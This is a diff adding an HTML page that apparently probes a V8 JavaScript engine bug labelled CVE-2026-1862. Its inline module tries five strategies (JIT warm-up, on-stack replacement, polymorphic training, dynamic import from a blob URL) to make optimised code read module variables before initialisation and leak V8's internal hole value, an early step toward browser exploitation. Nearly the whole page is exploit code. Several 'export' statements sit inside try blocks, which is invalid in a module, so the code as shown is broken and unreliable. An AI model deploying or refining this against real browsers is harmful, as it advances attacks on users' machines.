@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>loading...</title></head>
+<body>
+<pre id="out">CVE-2026-1862 v4 — inline module, multiple strategies</pre>
+<script type="module">
+// All inline to avoid CDN caching issues
+const log = (msg) => {
+  document.getElementById('out').textContent += '\n' + msg;
+  document.title = msg;
+};
+
+// ============================================
+// Strategy 1: OSR with branch-only TDZ access
+// Function loops, only accesses module var on last iteration
+// Interpreter never reaches the last iteration (OSR kicks in first)
+// ============================================
+try {
+  // This function references moduleX declared below
+  function leakOSR() {
+    for (let i = 0; i < 300000; i++) {
+      if (i === 299999) {
+        return moduleX; // TDZ access — only reached after Maglev OSR
+      }
+    }
+    return "no_reach";
+  }
+
+  let osrResult;
+  try {
+    osrResult = leakOSR();
+  } catch(e) {
+    osrResult = "THREW:" + e.message;
+  }
+
+  // Initialize AFTER the leak attempt
+  export let moduleX = 42;
+
+  let isHole = typeof osrResult === "undefined" && osrResult !== undefined;
+  log("S1_OSR: " + JSON.stringify({
+    result: String(osrResult),
+    type: typeof osrResult,
+    isUndef: osrResult === undefined,
+    isHole: isHole
+  }));
+} catch(e) {
+  log("S1_ERROR: " + e.message);
+}
+
+// ============================================
+// Strategy 2: Function polymorphism — train with safe values,
+// then trigger TDZ path after Maglev compilation
+// ============================================
+try {
+  let safeVal = 42;
+
+  // Function that reads either a safe local or the module var
+  function readPoly(useModule) {
+    if (useModule) {
+      return moduleY; // Module variable — TDZ if not initialized
+    }
+    return safeVal;
+  }
+
+  // Train with safe path (useModule=false) to get Maglev to compile
+  for (let i = 0; i < 200000; i++) {
+    readPoly(false);
+  }
+
+  // Now try the module path — Maglev may have compiled it without hole check
+  let polyResult;
+  try {
+    polyResult = readPoly(true);
+  } catch(e) {
+    polyResult = "THREW:" + e.message;
+  }
+
+  export let moduleY = 99;
+
+  let isHole = typeof polyResult === "undefined" && polyResult !== undefined;
+  log("S2_POLY: " + JSON.stringify({
+    result: String(polyResult),
+    type: typeof polyResult,
+    isUndef: polyResult === undefined,
+    isHole: isHole
+  }));
+} catch(e) {
+  log("S2_ERROR: " + e.message);
+}
+
+// ============================================
+// Strategy 3: Mixed training — access module var AFTER init, then
+// somehow trigger with hole. Use a second exported variable.
+// ============================================
+try {
+  export let moduleZ = 100; // Initialize FIRST
+  export let moduleW; // Will init later
+
+  function readZ() { return moduleZ; }
+  function readW() { return moduleW; }
+
+  // Train readZ (always succeeds, moduleZ=100)
+  for (let i = 0; i < 200000; i++) readZ();
+
+  // Train readW (moduleW is TDZ here!)
+  let wThrew = 0, wOk = 0;
+  for (let i = 0; i < 200000; i++) {
+    try {
+      readW();
+      wOk++;
+    } catch(e) {
+      wThrew++;
+    }
+  }
+
+  moduleW = 200;
+
+  log("S3_MIXED: " + JSON.stringify({
+    zResult: readZ(),
+    wThrew: wThrew,
+    wOk: wOk,
+    wAfterInit: readW()
+  }));
+} catch(e) {
+  log("S3_ERROR: " + e.message);
+}
+
+// ============================================
+// Strategy 4: Detect V8 tier info
+// Check if Maglev is even available
+// ============================================
+try {
+  // Try to detect optimization tier
+  function testHot() {
+    let sum = 0;
+    for (let i = 0; i < 1000000; i++) sum += i;
+    return sum;
+  }
+  let t0 = performance.now();
+  testHot();
+  let t1 = performance.now();
+  testHot();
+  let t2 = performance.now();
+
+  log("S4_TIER: first=" + (t1-t0).toFixed(1) + "ms, second=" + (t2-t1).toFixed(1) + "ms, speedup=" + ((t1-t0)/(t2-t1)).toFixed(1) + "x");
+} catch(e) {
+  log("S4_ERROR: " + e.message);
+}
+
+// ============================================
+// Strategy 5: Async timing — init module var, warm function,
+// then use dynamic import of module where var is in TDZ
+// ============================================
+try {
+  // Use setTimeout to delay and test if module vars are in cells
+  log("S5: testing async approach...");
+
+  // Create a blob URL with a module that has TDZ
+  const code = `
+    function leak() {
+      for (let i = 0; i < 300000; i++) {
+        if (i === 299999) return x;
+      }
+    }
+    let result;
+    try { result = leak(); } catch(e) { result = "THREW:" + e.message; }
+    export let x = 42;
+    export { result };
+  `;
+  const blob = new Blob([code], {type: 'application/javascript'});
+  const url = URL.createObjectURL(blob);
+
+  import(url).then(mod => {
+    let r = mod.result;
+    let isHole = typeof r === "undefined" && r !== undefined;
+    log("S5_DYNAMIC: " + JSON.stringify({
+      result: String(r),
+      type: typeof r,
+      isUndef: r === undefined,
+      isHole: isHole,
+      x: mod.x
+    }));
+  }).catch(e => {
+    log("S5_DYNERR: " + e.message);
+  });
+} catch(e) {
+  log("S5_ERROR: " + e.message);
+}
+
+log("=== All sync strategies done ===");
+</script>
+<script>
+// Poll for results
+let a = 0;
+let poll = setInterval(() => {
+  a++;
+  if (a > 60) clearInterval(poll);
+}, 500);
+</script>
+</body>
+</html>
